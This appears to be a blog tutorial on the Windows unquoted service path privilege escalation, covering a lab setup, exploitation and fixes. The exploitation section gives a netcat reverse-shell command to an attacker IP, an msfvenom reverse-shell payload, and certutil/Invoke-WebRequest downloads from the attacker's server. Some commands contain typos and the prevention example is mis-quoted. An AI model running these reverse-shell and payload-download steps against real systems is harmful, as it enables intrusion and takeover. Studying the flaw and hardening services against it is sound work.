---
layout: post
title: Unquoted Service Path Vulnerability
date: 2021-12-23 00:59
image: '/assets/img/posts/unquoted-service-path-vulnerability/unquotedbanner.png'
tags: [windows-privesc,unqoted-service-path,windows,pentesting]
featured: false
---

# What is Unquoted Service Path ?

**Unquoted Service Path** is a vulnerability that occurs when a service is created with a **service path** without appropriate
quoting surrounding the path string, and if the path contains spaces, that can end up with a **privilege escalation** with the
permissions of whoever created the service. 

# How it works ?

Typically [**Service Control Manager**](https://en.wikipedia.org/wiki/Service_Control_Manager) will run the service's executable
by looking at its full path.
- Path of the safe service -> "C:\Program Files\a folder\b folder\c folder\vulnservice.exe"

The service control manager will execute vulnservice.exe due to the fact that the path has appropriate quoting. 
<br>Basically, the system will interpret the path as a full string. 
<br>
<br>
However, if the full path of the service file is not enclosed within quotation marks just like the following example, things are
getting tricky:
- Path of the vulnerable service -> C:\Program Files\a folder\b folder\c folder\vulnservice.exe

This time, for each space in the path, the system will append the **.exe** extension at the end of the most recent 
space. Thus the first string chunk of the folder name will be treated as an executable.
<br>Interpretation would be as following:

1. C:\\**Program.exe**
2. C:\Program Files\\**a.exe** : If Progam.exe does not exist, execute a.exe
3. C:\Program Files\a folder\\**b.exe** : If a.exe does not exist, execute b.exe
4. C:\Program Files\a folder\b folder\\**c.exe** : If b.exe does not exist, execute c.exe
5. C:\Program Files\a folder\b folder\c folder\\**vulnservice.exe** : If c.exe does not exist, execute vulnservice.exe

# How to exploit it ?

Consider that you have gained a shell from a low privileged user in the system. However that user has the write permission
for one of these subfolders. Then you can deploy a malicious executable inside that subfolder by naming it with the the 
first string chunk of its child folder.

<br>Lets assume that the user that you have gained access to has the write permission for the b folder. If you create a malware 
named a.exe and drop it inside the b folder, the system will run your executable at the next run of the service.

# Setting the Lab 

In order to exploit the vulnerability, we need to create one.
<br>

Open up the start menu, and launch a command prompt by running it as an administrator.
<br>![](/assets/img/posts/unquoted-service-path-vulnerability/1.jpg)<br><br>


Create a low privileged user:
`net user krygen krygen /add`
![](/assets/img/posts/unquoted-service-path-vulnerability/2.jpg)<br><br>
Press **Win+R**, and run **lusrmgr.src**, to see all users and groups in the system.
<br>You can see the user krygen has been created successfully.
<br>It is also possbile to run '**net user krygen**' to get same information from the command line.
![](/assets/img/posts/unquoted-service-path-vulnerability/3.jpg)<br><br>
And the account belongs to the **Users Group**.
![](/assets/img/posts/unquoted-service-path-vulnerability/4.jpg)<br><br>
To create a vulnerable service run this command:
{% highlight powershell %}
sc create "Vuln Service" binpath=
"C:\Proogram Files\a folder\b folder\c folder\vulnservice.exe" Displayname= "Vulnerable Service" start= auto
{% endhighlight %}
- sc.exe is the utility to create and interact with the services.
- binpath is the path of the binary executable of the service.
- Displayname is not mandatory, if you leave it blank, it will take the name of the service.
- start is the start type, it can be either auto or manual.

![](/assets/img/posts/unquoted-service-path-vulnerability/5.jpg)<br><br>
<br> We can see the details of any service by runnig '**sc qc {SERVICE NAME}**'.
<br>Important fields to notice:
- START_TYPE = AUTO_START -> Service will start automatically when the sytem boots.
- SERVICE_START_NAME = LocalSystem -> Service will start with the LocalSystem service account privileges.

[**LocalSystem**](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account?redirectedfrom=MSDN) is a 
service account, and it has the highest privileges of the system, which is the system root.
<br> Read more about [**Microsoft Service Accounts**](https://stackoverflow.com/questions/510170/the-difference-between-the-local-system-account-and-the-network-service-acco).
![](/assets/img/posts/unquoted-service-path-vulnerability/6.jpg)<br><br>
Let create directories which is declared as a path for our service.
{% highlight powershell %}
mkdir "C:\Program Files\a folder\b folder\c folder"
{% endhighlight %}
![](/assets/img/posts/unquoted-service-path-vulnerability/7.jpg)<br><br>
As you can see, it is not possible to start the service since the there is no executable in path.
![](/assets/img/posts/unquoted-service-path-vulnerability/8.jpg)<br><br>

I will create two executables, both will delete different txt files from a specified path.
<br>One will delete **burak.txt** and the other, **krygen.txt**, for every 3 seconds.
![](/assets/img/posts/unquoted-service-path-vulnerability/9.jpg)_Source code for vulnservice.exe_<br><br>
![](/assets/img/posts/unquoted-service-path-vulnerability/10.jpg)_Source code for b.exe_<br><br>
I have compiled both C codes with GCC and converted them into executables.
<br>[**Download gcc compiler**](https://sourceforge.net/projects/gcc-win64/)
![](/assets/img/posts/unquoted-service-path-vulnerability/11.jpg)<br><br>

Put the **vulnservice.exe** into the **c folder**. When I start the service manually, starting from **C:\\**, the system will 
try to execute Program.exe then a.exe, then b.exe, then c.exe.However, none of them will be found. Thus vulnservice.exe will 
be executed as expected behaviour.
<br><br>
Let run the service:
{% highlight powershell %}
sc start "Vuln Service"
{% endhighlight %}

![](/assets/img/posts/unquoted-service-path-vulnerability/12.jpg)_First run: 0th second_<br><br>
![](/assets/img/posts/unquoted-service-path-vulnerability/13.jpg)_3rd second_<br><br>

Now put b.exe in a folder, then start the service again.
<br>Remember the execution the we have discussed at the beginning.
![](/assets/img/posts/unquoted-service-path-vulnerability/14.jpg)_First run: 0th second_<br><br>
As you can see, this time krygen.txt had been deleted instead of burak.txt, which is catastrophic for the system,
but it was what we were expecting.
![](/assets/img/posts/unquoted-service-path-vulnerability/15.jpg)_3rd second_

# Exploitation

We have set the environment up. However, until now, we had access to admin privileges. Thus we were able to start the service 
manually and write any of the subdirectories of the service path.
<br>As the name suggests **privilege escalation**, is about raising our permissions to the LocalSystem/root permissions from
a lower privileged user. There is no point to exploit a vulnerability after you have complete control over the system.
<br><br>
Let's check the the [**ACL(Access Control List)**](https://networkencyclopedia.com/access-control-list-acl/) of the 'C:\Program Files\a folder' with [**icacls**](https://www.techtarget.com/searchwindowsserver/definition/icacls). 
<br><br>Run:
{% highlight powershell %}
icacls "C:\Program Files\a folder"
{% endhighlight %}

<br>The Users Group entry, **BUILTIN\\Users:(I)(RX)**, gives access **read** and **execute** permissions 
for every user who belongs to **Users Group**. The **krygen** user we have created at the beginning of the 
post belongs to the Users Group. However, for the vulnerability to occur ,Users Group needs the **write** 
permission for any of those subfolders, a,b or c, it does not matter which. For this example I will use **a folder**.
![](/assets/img/posts/unquoted-service-path-vulnerability/16.jpg)<br><br>

Let us grant write access to Users Group for **a folder**.
<br><br>Run:
{% highlight powershell %}
icacls "C:\Program Files\a folder" /grant "BUILTIN\Users":W
{% endhighlight %}
Then run:
{% highlight powershell %}
icacls "C:\Program Files\a folder"
{% endhighlight %}
This time you will see a new entry **BUILTIN\\Users:(W)**
<br><br>Now the user we have created, krygen, can write to that specific directory.
![](/assets/img/posts/unquoted-service-path-vulnerability/17.jpg)<br><br>

Log in to the system with the account that you have created which belongs to the Users Group, for me it is krygen user.
<br>We will assume that, somehow you have gained accessed to the system as the user krygen.
<br>I will use [**netcat**](https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe)
in order to establish a connection and take a shell from krygen to my attacker machine.
<br><br>Run this on the attacker machine: 
{% highlight powershell %}
nc -nvlp {SOME FREE PORT}
{% endhighlight %}
Run that on the windows machine: 
{% highlight powershell %}
nc -e cmd.exe {IP OF THE ATTACKER MACHINE} {PORT THE ATTACKER MACHINE LISTENS TO}
{% endhighlight %}
![](/assets/img/posts/unquoted-service-path-vulnerability/18.jpg)<br><br>
Now that we have access to the krygen's shell, we can try to write to all those a,b and c folders by attempting to create a 
new folder in each of them to test which one of them is accessible. We already know it is **a folder**, no harm double-checking.

![](/assets/img/posts/unquoted-service-path-vulnerability/19.jpg)_Folder creation is successfull inside 'a folder'_<br><br>
![](/assets/img/posts/unquoted-service-path-vulnerability/20.jpg)_Failed to create folder inside 'b folder'_<br><br>
![](/assets/img/posts/unquoted-service-path-vulnerability/21.jpg)_Failed to create folder inside 'c folder'_<br><br>

Since the directory that we can write is the **a folder**, if we want the service to execute our binary executable
instead of the service file, the name of the malicious executable should be the first chunk of the child directory, which is
**b**.exe.
<br>
I am going to use [**msfvenom**](https://www.offensive-security.com/metasploit-unleashed/Msfvenom/) to create a reverse shell
binary back to my machine.

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|LHOST                   | The IP address that the reverse shell will connect     |
|LPORT                   | The port that the reverse shell will connect           |
|-p                      | Payload to use                                         |
|-o                      | Name of the file                                       |
|-f                      | File type of the output binary                         |

![](/assets/img/posts/unquoted-service-path-vulnerability/22.jpg)<br><br>

Now we need to download the executable to the victim machine.
<br>Run this in the directory that your executable locates. It will start a web server inside of that directory.
{% highlight bash %}
python -m http.server 80
{% endhighlight %}


![](/assets/img/posts/unquoted-service-path-vulnerability/23.jpg)<br><br>
<br>You can download any file from the running python server by using one of these utilites.

{% highlight powershell %}
powershell -c "Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}"
{% endhighlight %}

{% highlight powershell %}
certutil.exe -urlcache -split -f http://{YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD}
{% endhighlight %}

Double-check to see if the executable downloaded successfully into the directory to which you have the write access.

![](/assets/img/posts/unquoted-service-path-vulnerability/24.jpg)<br><br>
Start a **netcat** listener on the port you declared in the reverse shell binary.

![](/assets/img/posts/unquoted-service-path-vulnerability/25.jpg)<br><br>

Since we do not have **LocalSystem** permissions, it is impossible to start the service manually. However, the start type of the 
service is **AUTO_START**. Thus the service will be initialized at the system boot. All we have to do is reboot the system
and wait for the connection to establish.
<br>Run:
{% highlight powershell %}
sutdown /r /t 0
{% endhighlight %}
![](/assets/img/posts/unquoted-service-path-vulnerability/27.jpg)<br><br>

Hurray ! The connection has been established successfully, even though no login had not yet been attempted on the windows machine.
The path we are in is **system32**, which means we have the console with administrator rights, 
have fun after that point :))).
![](/assets/img/posts/unquoted-service-path-vulnerability/28.jpg)<br><br>

# How to fix it ?

First of all, run this to see if there is any service with an unquoted path variable.:
{% highlight powershell %}
wmic service get name,pathname,displayname,startmode | findstr /i auto |
findstr /i /v "C:\Windows\" | findstr /i /v """
{% endhighlight %}
![](/assets/img/posts/unquoted-service-path-vulnerability/29.jpg)<br><br>

If there is, then press **Win+R** and type **regedit.exe**, press enter.
<br>In the directory tree, search for the vulnerable service name under:<br> **Computer\\HKEY_LOCAL_MACHINE\\SYSTEM
\\ControlSet\\Services\\{SERVICE NAME}**.
![](/assets/img/posts/unquoted-service-path-vulnerability/31.jpg)<br><br>

Find the **ImagePath** entry, double click it.
![](/assets/img/posts/unquoted-service-path-vulnerability/32.jpg)<br><br>

Change its value by surrounding the string with quotes.
![](/assets/img/posts/unquoted-service-path-vulnerability/33.jpg)<br><br>

Run again, this time you should not see any results, you have fixed it:
{% highlight powershell %}
wmic service get name,pathname,displayname,startmode | findstr /i auto |
findstr /i /v "C:\Windows\" | findstr /i /v """
{% endhighlight %}

# How to prevent it ?

How on the world I can create a safe service ?
<br> Simple, when creating a service with `sc.exe`, do not pass the parameter for **binpath** like this:
{% highlight powershell %}
binpath= "C:\Program Files\a folder\b folder\c folder"
{% endhighlight %}

Instead, do it like this:
{% highlight powershell %}
binpath= "\"C:\Program Files\a folder\b folder\c folder"\"
{% endhighlight %}


Enjoy your safely created service.
![](/assets/img/posts/unquoted-service-path-vulnerability/35.jpg)<br><br>

Thanks for reading.
